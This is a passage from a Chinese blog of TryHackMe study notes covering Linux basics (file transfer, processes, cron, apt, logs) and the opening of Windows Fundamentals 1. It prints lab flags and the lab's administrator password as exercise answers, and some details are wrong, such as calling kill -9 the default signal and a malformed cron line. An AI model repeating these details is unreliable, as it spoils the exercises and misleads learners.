MB/s) - ‘file’ saved [51095/51095]</span><br></pre></td></tr></table></figure></div>

<p>在上面的示例中，我们可以看到<code>wget</code>命令成功地将名为“file”的文件下载到我们的机器上，这个http请求会被HTTPServer记录(就像任何web服务器一样)：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Using Python to start a web server 终端界面示例</span></span><br><span class="line">tryhackme@linux3:/tmp# python3 -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br><span class="line">127.0.0.1 - - [04/May/2021/14:26:09] &quot;GET /file HTTP/1.1&quot; 200 -</span><br></pre></td></tr></table></figure></div>

<p>tips： 关于Python3”HTTPServer”模块的文档—— <a class="link"   href="https://docs.python.org/3/library/http.server.html" >https://docs.python.org/3/library/http.server.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。</p>
<h3 id="答题-1"><a href="#答题-1" class="headerlink" title="答题"></a><strong>答题</strong></h3><p>通过SSH会话对目标Linux虚拟机进行操作：</p>
<p>使用 Python3 的“HTTPServer”模块在目标机器的“tryhackme”用户的主目录中启动 Web 服务器。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230404095742155.png"
                      alt="image-20230404095742155"
                ></p>
<p>在本地攻击机上下载刚才启动的简易web服务器所托管的文件。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">wget http://MACHINE_IP:8000/.flag.txt</span> </span><br><span class="line">wget http://10.10.85.109:8000/.flag.txt </span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230404100122129.png"
                      alt="image-20230404100122129"
                ></p>
<blockquote>
<p>flag为：THM{WGET_WEBSERVER} 。</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230404100230199.png"
                      alt="image-20230404100230199"
                ></p>
<h2 id="Linux进程基础"><a href="#Linux进程基础" class="headerlink" title="Linux进程基础"></a>Linux进程基础</h2><p>进程（Process）是指在你的计算机中正在运行的程序，它们由操作系统内核进行管理，并且每个进程都会有一个与之关联的ID，这个ID被称为PID。PID会根据进程启动的顺序而递增，也就是说，第60个进程的PID即为60。</p>
<p><strong>查看进程(Viewing Processes)</strong></p>
<p>Linux <code>ps</code>（英文全拼：process status）命令用于显示当前进程的状态，类似于 windows 的任务管理器。</p>
<p>我们可以使用<code>ps</code>命令来列出正在运行的进程的一个列表，该列表将提供一些附加信息，如进程的PID、进程的状态码、进程相关的CPU占用情况、正在执行的实际程序或命令的名称等。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230404110917497.png"
                      alt="image-20230404110917497"
                ></p>
<p>从上图中我们可以看到：我们第一次执行<code>ps</code>命令时，<code>ps</code>本身的进程PID是204，然后当我们再次执行<code>ps</code>命令时，<code>ps</code>本身的进程PID增加到了205（这说明PID确实会根据进程启动的顺序而递增）。</p>
<p>如果我们要查看由其他用户运行的进程和那些不在会话中运行的进程(即系统进程)，我们需要为<code>ps</code>命令提供<code>aux</code>参数：<code>ps aux</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230404112406775.png"
                      alt="image-20230404112406775"
                ></p>
<p>从上图中我们可以看到现在总共有5个进程，相关的用户名称为“root”和“cmnatic”。</p>
<p>另一个非常有用的命令是<code>top</code>命令，此命令能为你提供有关系统上正在运行的进程的实时统计信息，而不仅是一次性视图；<code>top</code>命令所提供的统计信息将每几秒钟刷新一次，但是每当你使用方向键浏览各行信息时也会进行刷新。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230404120541306.png"
                      alt="image-20230404120541306"
                ></p>
<p>关于ps命令的使用参考：<a class="link"   href="https://www.runoob.com/linux/linux-comm-ps.html" >https://www.runoob.com/linux/linux-comm-ps.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><strong>终止进程(Managing Processes)</strong></p>
<p>我们可以通过发送一些信号来终止进程，这些终止进程的信号有多种类型，这主要与系统内核如何“干净”地处理进程有关。</p>
<p>如果我们要终止一个命令(在Linux中，我们可以把进程理解为正在运行的命令)，我们可以使用适当命名的<code>kill</code>命令与我们所希望kill的相关PID组合在一起；例如，我们想要kill一个PID为1337的进程，我们可以使用以下命令：<code>kill 1337</code></p>
<p>下面是当进程被杀死时我们可以发送给进程的一些信号（使用<code>kill -l</code>可列出当前所支持的所有信号类型）：</p>
<ul>
<li>SIGTERM（<code>kill -15</code>）：终止进程，但允许它事先执行一些清理任务；</li>
<li>SIGKILL（<code>kill -9</code>）：默认信号，<code>-9</code>参数可以省略，表示终止进程并且不做任何事后清理；</li>
<li>SIGSTOP（<code>kill -19</code>）：停止或者挂起进程；</li>
<li>SIGHUP（<code>kill -1</code>）：重启进程；</li>
<li>SIGCONT（<code>kill -18</code>）：继续进程。</li>
</ul>
<p><strong>进程如何启动</strong></p>
<p>操作系统(OS)使用名称空间并最终能将计算机上的可用资源分配给(如CPU、RAM和高优先级)进程，你可以把这个过程想象成将你的计算机资源分成几片——类似于切割一块蛋糕；在切片内的进程将拥有一定的计算机资源，然而，这部分资源也只是所有进程实际可用的一小部分。</p>
<p>名称空间对于安全性非常重要，因为它是将一个进程与其他进程隔离的方式——只有相同名称空间中的进程才能相互看到。</p>
<p>我们之前讨论过PID是如何工作的，这就是名称空间可发挥作用的地方；PID为1的进程为系统启动时会自动运行的进程，这个进程在Ubuntu中是系统的初始化(init)进程，比如<code>systemd</code>，它能够用于提供一种在操作系统和用户之间管理用户进程的方法。</p>
<p>一旦系统启动并初始化，<code>systemd</code>就会成为首先自动运行的进程之一，而我们想要运行的任何程序或软件都将作为<code>systemd</code>进程的子进程启动；虽然这些子进程由<code>systemd</code>控制，但仍将作为单独的进程运行(尽管会共享来自<code>systemd</code>的资源)，这能使我们更容易识别各个进程。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230404183329221.png"
                      alt="image-20230404183329221"
                ></p>
<p><strong>在系统启动时启动进程&#x2F;服务</strong></p>
<p>一些应用程序可以在我们的计算机系统启动时启动，例如，web服务器、数据库服务器或文件传输服务器等，这些软件通常很关键，因而经常被管理员告知在系统启动期间启动。</p>
<p>为了在系统启动时启动进程&#x2F;服务，我们可以使用<code>systemctl</code>命令，该命令允许我们与<code>systemd</code> 进程（守护进程）交互；<code>systemctl</code>是一个易于使用的命令，它采用以下语法格式：<code>systemctl [option] [service]</code></p>
<p>如果我们要让apache服务启动，我们可以使用<code>systemctl start apache2</code>，如果想让apache服务停止，我们只需将<code>[option]</code>替换成<code>stop</code>即可。</p>
<p>我们可以为<code>systemctl</code>命令设置以下四个选项：</p>
<ul>
<li>Start</li>
<li>Stop</li>
<li>Enable</li>
<li>Disable</li>
</ul>
<p><strong>Linux前台和后台介绍</strong></p>
<p>进程可以以两种状态运行：在前台运行、在后台运行。</p>
<p>你在Linux终端中运行的命令，如“echo”将在终端的前台运行，<code>echo</code>命令是一个很好的例子，因为<code>echo</code>命令的输出将在前台返回，并且无法在后台返回：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230404190321839.png"
                      alt="image-20230404190321839"
                ></p>
<p>如上图所示：当我们运行<code>echo &quot;Hi THM&quot;</code>命令时，我们能在终端前台看到命令的输出；但当我们在<code>echo &quot;Hi THM&quot;</code>之后添加<code>&amp;</code>操作符之后，我们只能在终端前台看到<code>echo</code>进程的ID（而不是命令的输出）——因为此时<code>echo</code>命令正在后台运行。</p>
<p>前后台机制对于复制文件之类的命令非常有用，因为这将允许我们同时在终端前台和终端后台执行不同的命令；以使用复制文件命令为例，后台化此命令意味着——我们不必等待文件复制命令执行完成，就能同时执行其他命令。</p>
<p>当我们在执行脚本之类的程序文件时，我们也可以让这个进程后台化，此处不依赖于<code>&amp;</code>操作符，而是需要我们在键盘上使用<code>Ctrl + Z</code>来设置进程的后台化，这也是一种“暂停”脚本运行或命令执行的有效方法，如下图所示：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230404192831824.png"
                      alt="image-20230404192831824"
                ></p>
<p>由上图可知：示例脚本会持续输出内容 “This will keep on looping until I stop!”，直到我们停止或者挂起与该脚本对应的进程，我们可以通过在键盘上使用Ctrl + Z(在终端界面由T^Z表示)来停止示例脚本的运行。</p>
<p><strong>前台化进程</strong></p>
<p>假设现在有一个进程（”background.sh”脚本）在后台运行，我们可以通过使用<code>ps aux</code>命令来确认这一点：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230404194127042.png"
                      alt="image-20230404194127042"
                ></p>
<p>我们已经知道，在键盘上使用<code>Ctrl + Z</code>或者在命令中添加<code>&amp;</code>操作符能够使进程后台化；同样，我们还可以通过使用<code>fg</code>命令将后台进程重新前台化。</p>
<p>如下所示：在我们使用<code>fg</code>命令之后，”background.sh”脚本所对应的进程能够重新回到终端前台（此时的”background.sh”脚本仍将处于运行状态）。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230404195229427.png"
                      alt="image-20230404195229427"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230404195245222.png"
                      alt="image-20230404195245222"
                ></p>
<h3 id="答题-2"><a href="#答题-2" class="headerlink" title="答题"></a><strong>答题</strong></h3><p><em>tips：阅读本小节的内容以帮助回答以下问题</em></p>
<p>通过SSH会话对目标Linux虚拟机进行操作：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">ps aux </span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230404202323290.png"
                      alt="image-20230404202323290"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230404202348522.png"
                      alt="image-20230404202348522"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230404202407739.png"
                      alt="image-20230404202407739"
                ></p>
<blockquote>
<p>隐藏的flag为：THM{PROCESSES} 。</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230404202510832.png"
                      alt="image-20230404202510832"
                ></p>
<h2 id="Linux定时任务"><a href="#Linux定时任务" class="headerlink" title="Linux定时任务"></a>Linux定时任务</h2><p>用户可能希望设置某个操作或任务在系统启动后得到执行，例如：运行一些命令、备份指定文件、启动某个程序等等。</p>
<p>为了对操作或任务的执行进行定时设置，我们接下来将讨论<code>cron</code>进程，更具体地说：我们将学习如何通过<code>crontab</code>与<code>cron</code>进程进行交互，<code>crontab</code>是在系统引导期间所启动的进程之一，它负责促进和管理cron jobs（定时任务）。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230404214102711.png"
                      alt="image-20230404214102711"
                ></p>
<p>crontab是一个特殊的文件，其格式可被<code>cron</code>进程识别以逐步执行crontab的每一行，crontab需要具有以下 6 个特定字段值：</p>
<ul>
<li>MIN：每多少分钟（minute ）执行；</li>
<li>HOUR：每多少小时（hour）执行 ；</li>
<li>DOM：在一个月的每哪一天（Day Of the Month）执行 ；</li>
<li>MON：在一年的每哪个月（Month of the year）执行；</li>
<li>DOW：在一个星期的每哪一天（Day Of the Week）执行；</li>
<li>CMD：实际上将被执行的命令（command）。</li>
</ul>
<p>以备份文件为例，你可能希望每12小时备份一次”cmnatic”用户的”Documents”，我们将为此使用以下格式命令：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">0 *12 * * * cp -R /home/cmnatic/Documents /var/backups/</span><br></pre></td></tr></table></figure></div>

<p>crontab的一个有趣特性是支持通配符(<code>*</code>)，如果我们不希望为某个特定的字段提供一个值，我们就可以用<code>*</code>代替；如上面的定时任务示例（备份文件），我们不关心这个任务执行的月份、日期以及年份——我们只关心它做到每12小时执行一次，所以我们只需放置星号来代替我们所不关心的值。</p>
<p>我们可以使用在线的“<a class="link"   href="https://crontab-generator.org/" >Crontab Generator <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>”工具，它可以帮助生成符合格式的crontab命令；我们还可以使用“<a class="link"   href="https://crontab.guru/" >Cron Guru <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>”工具，它会分析crontab执行的时间点。</p>
<p>我们可以通过使用<code>crontab -e</code>命令并且选择一个编辑器(比如Nano)来编辑crontab文件的内容：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230404220822701.png"
                      alt="image-20230404220822701"
                ></p>
<p>tips：我们通过<code>crontab</code>命令可以添加、删除、编辑自动化任务（定时任务）。</p>
<h3 id="答题-3"><a href="#答题-3" class="headerlink" title="答题"></a><strong>答题</strong></h3><p>通过SSH会话对目标Linux虚拟机进行操作：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">crontab -e</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230404230933785.png"
                      alt="image-20230404230933785"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230404230914685.png"
                      alt="image-20230404230914685"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230404231038141.png"
                      alt="image-20230404231038141"
                ></p>
<h2 id="Linux软件包管理"><a href="#Linux软件包管理" class="headerlink" title="Linux软件包管理"></a>Linux软件包管理</h2><p><strong>介绍软件包和软件存储库</strong></p>
<p>当开发人员希望向Linux社区提交软件时，他们会将其提交到“apt”存储库，如果获得Linux官方批准，那么他们所提交的程序和工具将被发布到公共区域。</p>
<p>Linux最可取的两个特性在这里脱颖而出：具有用户可访问性、能够发挥开源工具的优点。</p>
<p>当我们在 Ubuntu 20.04 Linux 机器上的&#x2F;etc&#x2F;apt目录中使用 <code>ls</code> 命令时，能够看到以下文件，这些文件可用作网关&#x2F;注册表。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230404232002556.png"
                      alt="image-20230404232002556"
                ></p>
<p>虽然操作系统供应商将维护他们自己的存储库，但你也可以选择将一些社区存储库添加到你的源列表中，这将允许你扩展Linux操作系统的功能。</p>
<p>例如：我们可以使用<code>add-apt-repository</code>命令添加其他存储库到我们的系统，在实际使用这个命令时，我们可以择优添加系统资源供应商所提供的存储库（一些系统资源供应商会拥有一个更接近我们机器的地理位置的存储库）。</p>
<p><strong>管理存储库(添加和删除)</strong></p>
<p>通常我们可以使用<code>apt</code>命令将软件安装到我们的Linux系统中，<code>apt</code>命令是apt包管理软件的一部分；apt包管理软件（即包管理器）包含了一整套工具，这些工具允许我们管理软件包和软件源，同时还能帮助我们安装软件或者删除软件。</p>
<p>添加存储库的一种方法是使用我们上面提到的<code>add-apt-repository</code>命令，但是我们也可以手动添加和删除存储库。</p>
<p>虽然你也可以选择使用其他包安装程序(如<code>dpkg</code>)来安装软件，但是使用apt包管理器的好处是：每当我们更新系统时，它都会检查包含我们添加的软件的存储库是否有更新。</p>
<p>在接下来的示例中，我们将把Sublime text文本编辑器作为一个存储库添加到Ubuntu机器中(这个文本编辑器并不是默认的Ubuntu存储库的一部分)；在我们添加软件时，我们所下载的软件的完整性是通过使用所谓的GPG (Gnu Privacy Guard)密钥来保证的，这些密钥本质上是开发人员所提供的安全检查，能够表明“这是我们的软件”，如果当前密钥与操作系统所信任的密钥（即开发人员使用的密钥）不匹配，那么计算机就不会执行下载软件的操作。</p>
<p>因此，我们首先需要添加Sublime Text 3开发人员所使用的GPG密钥。(此过程需要访问互联网)</p>
<p>添加存储库的示例：</p>
<p>1.下载GPG密钥并使用apt-key信任这个密钥：<code>wget -qO - https://download.sublimetext.com/sublimehq-pub.gpg | sudo apt-key add -</code></p>
<p>2.现在我们已经将密钥添加到我们的可信列表中，我们可以开始将Sublime Text 3的存储库添加到我们的apt源列表中；一个好的做法是为我们添加的每个不同的社区&#x2F;第三方存储库都分配一个单独的文件。</p>
<p>2.1让我们在 &#x2F;etc&#x2F;apt&#x2F;sources.list.d目录中创建一个名为sublime-text.list的文件：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230405000525903.png"
                      alt="image-20230405000525903"
                ></p>
<p>2.2使用Nano或其他文本编辑器，添加并保存Sublime text 3存储库到刚才新创建的文件中：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230405000715814.png"
                      alt="image-20230405000715814"
                ></p>
<p>2.3在我们添加了以上条目之后，我们需要更新apt包以识别这个新条目——这是通过使用<code>apt update</code>命令完成的。</p>
<p>2.4成功更新apt包之后，我们现在可以继续安装我们所信任的并且已经添加到apt包中的软件——<code>apt install sublime-text</code></p>
<p>删除软件包的方法很简单，我们可以使用<code>add-apt-repository --remove ppa:PPA_Name/ppa</code>命令来完成，也可以通过手动删除之前添加的文件来完成。</p>
<p>当我们成功删除了软件包之后，我们还需要使用<code>apt remove [software-name-here]</code>来清理apt包，例如：<code>apt remove sublime-text</code> 。</p>
<p>tips：在删除软件包时，我们要将上述示例命令中的<code>PPA_Name</code>替换为我们期望删掉的<code>PPA</code>的名称（该名称在以上示例中为“sublime-text”）。</p>
<h2 id="Linux日志"><a href="#Linux日志" class="headerlink" title="Linux日志"></a>Linux日志</h2><p>我们在 Linux 基础知识第一部分中简要介绍了日志文件以及它们所在的位置，现在，让我们快速回顾一下：这些包含日志信息的文件和文件夹位于<code>/var/log</code>目录中，主要包含了在系统上所运行的应用程序、服务的日志记录信息。 </p>
<p>操作系统 (OS) 擅长通过一个被称为“轮换-rotating”的过程来自动管理日志信息。</p>
<p>以下是Linux机器上正在运行的三个服务以及和这些服务相关的日志信息（此处仅为示例）：</p>
<ul>
<li>Apache2 web服务器；</li>
<li>fail2ban服务（此服务的日志信息可用于监视攻击者所尝试的暴力操作）；</li>
<li>UFW服务，用作防火墙；</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230404204023732.png"
                      alt="image-20230404204023732"
                ></p>
<p>通过查看这些服务日志，能够很好地监视系统运行状况以及保护系统的安全；而且，像web server这样的服务所对应的日志文件，还包含了关于每个请求的信息——这将允许网站开发人员或网站管理员诊断web服务的性能，并且有助于调查网络入侵者的活动。</p>
<p>关于web服务，下面两种类型的日志文件是值得我们注意的：</p>
<ul>
<li>access log</li>
<li>error log</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230404204753923.png"
                      alt="image-20230404204753923"
                ></p>
<p>tips：日志文件会存储关于操作系统如何运行的信息，还会存储用户所执行的操作，例如身份验证尝试。</p>
<h3 id="答题-4"><a href="#答题-4" class="headerlink" title="答题"></a><strong>答题</strong></h3><p>通过SSH会话对目标Linux虚拟机进行操作：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230404210233373.png"
                      alt="image-20230404210233373"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230404210347221.png"
                      alt="image-20230404210347221"
                ></p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>欢迎来到Linux基础模块的末尾，随着你与Linux交互时间的增加，你对Linux的熟悉程度也将会得到提高。</p>
<p>本文主要介绍了以下内容：</p>
<ul>
<li>关于两种终端文本编辑器（nano和vim）的简介；</li>
<li>了解Linux中的一般实用程序，如下载文件、传输文件、使用python web服务器托管本地内容；</li>
<li>了解Linux中的进程；</li>
<li>通过学习crontab定时任务、软件包管理和日志检查来维护和自动化你的Linux系统。</li>
</ul>
<p>可参考的Linux中文学习资源：</p>
<ul>
<li>Linux中文教程：<a class="link"   href="https://www.runoob.com/linux/linux-tutorial.html" >https://www.runoob.com/linux/linux-tutorial.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>Linux 命令大全：<a class="link"   href="https://www.runoob.com/linux/linux-command-manual.html" >https://www.runoob.com/linux/linux-command-manual.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>Linux 常用命令英文全拼：<a class="link"   href="https://www.runoob.com/w3cnote/linux-command-full-fight.html" >https://www.runoob.com/w3cnote/linux-command-full-fight.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<p>你可以通过以下TryHackMe实验房间继续扩展你的Linux基础学习：</p>
<ul>
<li>Bash Scripting（Bash脚本基础） - <a class="link"   href="https://tryhackme.com/room/bashscripting" >https://tryhackme.com/room/bashscripting <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>Regular Expressions（正则表达式基础） - <a class="link"   href="https://tryhackme.com/room/catregex" >https://tryhackme.com/room/catregex <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
]]></content>
      <categories>
        <category>TryHackMe笔记</category>
      </categories>
      <tags>
        <tag>TryHackMe</tag>
        <tag>网络安全基础</tag>
      </tags>
  </entry>
  <entry>
    <title>THM-Windows Fundamentals 1(Windows基础知识1)-学习</title>
    <url>/2024/01/27/THM-Windows%20Fundamentals%201(Windows%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%861)-%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>本文相关的TryHackMe实验房间链接：<a class="link"   href="https://tryhackme.com/room/windowsfundamentals1xbx" >https://tryhackme.com/room/windowsfundamentals1xbx <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>本文介绍：本文所涉及的内容是Windows 基础模块的第 1 部分，我们将了解 Windows 桌面、NTFS 文件系统、UAC、控制面板等Windows基础组件。</p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Windows操作系统(OS)是一个复杂的产品，有许多系统文件、实用程序、设置、功能等。</p>
<p>本文将尝试对Windows操作系统作一般概述，比如浏览用户界面，对系统进行更改等。</p>
<p>启动本文相关实验房间中所附加的Windows虚拟机（你可以直接在浏览器中访问），如果你希望通过<a class="link"   href="https://www.cyberark.com/resources/threat-research-blog/explain-like-i-m-5-remote-desktop-protocol-rdp" >远程桌面 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>访问Windows虚拟机，请使用以下凭据：</p>
<ul>
<li><p>Machine IP: <code>MACHINE_IP</code>（在实验房间中启动Windows虚拟机之后，你将获得一个相关的ip地址）</p>
</li>
<li><p>User: <code>administrator</code></p>
</li>
<li><p>Password: <code>letmein123!</code></p>
</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230331090333532.png"
                      alt="image-20230331090333532"
                ></p>
<p>当上述界面弹出提示时，点击接受证书，然后你现在应该可以登录到远程系统。</p>
<h2 id="Windows版本"><a href="#Windows版本" class="headerlink" title="Windows版本"></a>Windows版本</h2><p>Windows操作系统有很长的历史，可以追溯到1985年，目前，它是家庭和公司网络的主要操作系统。正因为如此，Windows操作系统一直是黑客和恶意软件作者的目标。</p>
<p>Windows XP是Windows的一个流行版本，运行时间很长；微软还发布过Windows Vista，Vista是对Windows操作系统的一次彻底改造。Windows Vista存在很多问题，因此它在Windows用户中反响不佳，并很快就被淘汰了。</p>
<p>当微软(Microsoft)宣布Windows XP寿终待寝时，许多用户都陷入了恐慌。企业、医院等组织争先恐后地在许多其他硬件和设备上测试下一个可行的Windows版本，即Windows 7；厂商们不得不争分夺秒地工作，以确保他们的产品与Windows 7能够兼容，如果他们做不到，他们的客户就不得不撕毁协议，并寻找另一家可升级他们的产品以兼容Windows 7的供应商。</p>
<p>Windows 7虽然很快就发布了，但它也被标记上了终止支持的日期，然后是Windows 8.x，8.x出现时间很短暂，就像Vista一样。</p>
<p>后面出现了Windows 10，这是目前普遍用于台式电脑的Windows操作系统版本。Windows 10有两种版本，家庭版和专业版，<a class="link"   href="https://www.microsoft.com/en-us/windows/compare-windows-10-home-vs-pro" >家庭版和专业版存在一些区别 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
<p>tips：尽管我们没有谈论服务器，但也有可用于服务器的Windows操作系统，比如<a class="link"   href="https://www.microsoft.com/en-us/windows-server" >Windows Server 2022 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
<p>许多批评人士喜欢抨击微软，但微软每一个新版本的Windows操作系统的可用性和安全性方面都取得了长足进步。</p>
<p>注：本文所探索的Windows虚拟机的操作系统版本为“Windows Server 2019 Standard”，详见此Windows虚拟机中的“系统信息”界面。</p>
<p>截至2021年6月，微软宣布了<a class="link"   href="https://docs.microsoft.com/en-us/lifecycle/products/windows-10-home-and-pro?ranMID=24542&ranEAID=kXQk6*ivFEQ&ranSiteID=kXQk6.ivFEQ-M28j3qbUhtM2JFCT2wmhOA&epi=kXQk6.ivFEQ-M28j3qbUhtM2JFCT2wmhOA&irgwc=1&OCID=AID2000142_aff_7593_1243925&tduid=(ir__uszrgcddyskfqz3fkk0sohz3wv2xuurc01kgzkod00)(7593)(1243925)(kXQk6.ivFEQ-M28j3qbUhtM2JFCT2wmhOA)()&irclickid=_uszrgcddyskfqz3fkk0sohz3wv2xuurc01kgzkod00&ranMID=24542&ranEAID=kXQk6*ivFEQ&ranSiteID=kXQk6.ivFEQ-4cKUPfbv9lM_IR2EX7K_hw&epi=kXQk6.ivFEQ-4cKUPfbv9lM_IR2EX7K_hw&irgwc=1&OCID=AID2000142_aff_7593_1243925&tduid=(ir__feexvhocigkfqna9kk0sohznb32xutanagupypus00)(7593)(1243925)(kXQk6.ivFEQ-4cKUPfbv9lM_IR2EX7K_hw)()&irclickid=_feexvhocigkfqna9kk0sohznb32xutanagupypus00" >Windows 10的退休日期 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>：“微软将继续支持至少一个Windows 10版本，直到2025年10月14日。”</p>
<p>截至2021年10月5日，Windows 11已经成为终端用户可用的Windows操作系统。</p>
<p>访问以下链接，可阅读更多关于Windows 11的信息：<a class="link"   href="https://www.microsoft.com/en-us/windows?wa=wsignin1.0" >https://www.microsoft.com/en-us/windows?wa=wsignin1.0 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><strong>答题</strong></p>
<p>阅读以下链接，查看Windows 10家庭版和专业版的区别：</p>
<p><a class="link"   href="https://www.microsoft.com/en-us/windows/compare-windows-10-home-vs-pro" >https://www.microsoft.com/en-us/windows/compare-windows-10-home-vs-pro <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230331100052164.png"
                      alt="image-20230331100052164"
                ></p>
<blockquote>
<p>答案：BitLocker</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230331095806462.png"
                      alt="image-20230331095806462"
                ></p>
<h2 id="桌面（图形用户界面）"><a href="#桌面（图形用户界面）" class="headerlink" title="桌面（图形用户界面）"></a>桌面（图形用户界面）</h2><p>Windows 桌面，简称Windows图形用户界面(GUI)，是你登录 Windows 计算机后能看到并使用的主屏幕界面。</p>
<p>通常情况下，你需要先通过登录界面完成系统登录，然后才能看到Windows桌面。在登录界面上，你需要输入有效的帐户名称和登录凭据，这通常是该特定系统使用者的用户名和密码或者是Active Directory环境(如果是加入域的机器)中先前存在的Windows帐户的用户名和密码。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230331100826045.png"
                      alt="image-20230331100826045"
                ></p>
<p>上面的截图就是一个典型的Windows Desktop的例子，以下是组成上述GUI的一些组件名称：</p>
<ol>
<li>The Desktop（主桌面）</li>
<li>Start Menu（开始菜单）</li>
<li>Search Box (搜索框-Cortana)</li>
<li>Task View（任务视图）</li>
<li>Taskbar（任务栏）</li>
<li>Toolbars（工具栏）</li>
<li>Notification Area（通知区域）</li>
</ol>
<p><strong>The Desktop（主桌面）</strong></p>
<p>桌面是你可以快捷进入程序、文件夹、文件等的地方。计算机程序和文件的图标要么按照字母顺序排列在文件夹中，要么随机分散在桌面上，并没有特定的组织；但是，放在文件夹中的程序通常也可以通过桌面上的对应快捷方式被用户快速访问。</p>
<p>桌面的外观和风格可以根据用户的喜好自行进行更改。你可以右键单击桌面上的任何位置，然后就能出现一个上下文菜单，此菜单将允许你更改桌面图标的大小、指定图标的排列方式，并且还能允许你将项目复制&#x2F;粘贴到桌面，以及在桌面上创建新项目(如创建文件夹、快捷方式或文本文档)等等。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230331183522221.png"
                      alt="image-20230331183522221"
                ></p>
<p>通过“显示设置-Display settings”功能，你还可以更改屏幕的分辨率和屏幕方向，如果你有多个电脑屏幕，你可以在这里对多屏幕设置进行配置。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230331183648774.png"
                      alt="image-20230331183648774"
                ></p>
